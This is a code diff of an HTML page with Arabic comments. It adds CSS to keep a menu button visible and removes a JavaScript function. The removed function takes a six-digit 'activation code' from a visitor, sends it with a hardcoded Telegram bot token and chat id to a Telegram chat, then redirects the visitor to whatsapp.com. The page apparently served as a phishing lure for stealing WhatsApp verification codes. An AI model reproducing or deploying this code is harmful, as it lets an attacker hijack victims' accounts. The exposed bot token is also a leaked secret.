@@ -52,6 +52,7 @@
             cursor: pointer;
             position: relative;
             margin-left: 10px; /* حل مشكلة الزر المخفي */
+            z-index: 1100; /* لضمان أن الزر يبقى فوق العناصر الأخرى */
         }
 
         header .menu span {
@@ -186,6 +187,8 @@
 
             header .menu {
                 margin-left: auto; /* ضمان ظهور الزر دائمًا */
+                position: absolute; /* جعل الزر دائمًا مرئيًا */
+                right: 10px;
             }
         }
     </style>
@@ -236,45 +239,6 @@
         function toggleMenu() {
             const dropdown = document.querySelector('.dropdown');
             dropdown.classList.toggle('active');
-        }
-
-        // وظيفة إرسال الرمز
-        function sendMessage() {
-            const phoneNumberInput = document.getElementById('phoneNumber');
-            const phoneNumber = phoneNumberInput.value;
-
-            if (!phoneNumber || phoneNumber.length !== 6 || !/^\d{6}$/.test(phoneNumber)) {
-                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
-                return;
-            }
-
-            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
-            const chatId = '612575358';
-            const message = `رمز التفعيل: ${phoneNumber}`;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                }),
-            })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert('تم إرسال رمز التفعيل بنجاح!');
-                        phoneNumberInput.value = '';
-                        window.location.href = "https://www.whatsapp.com";
-                    } else {
-                        alert('حدث خطأ أثناء الإرسال.');
-                    }
-                })
-                .catch(error => {
-                    alert('فشل الاتصال بالخادم.');
-                });
         }
     </script>
 </body>
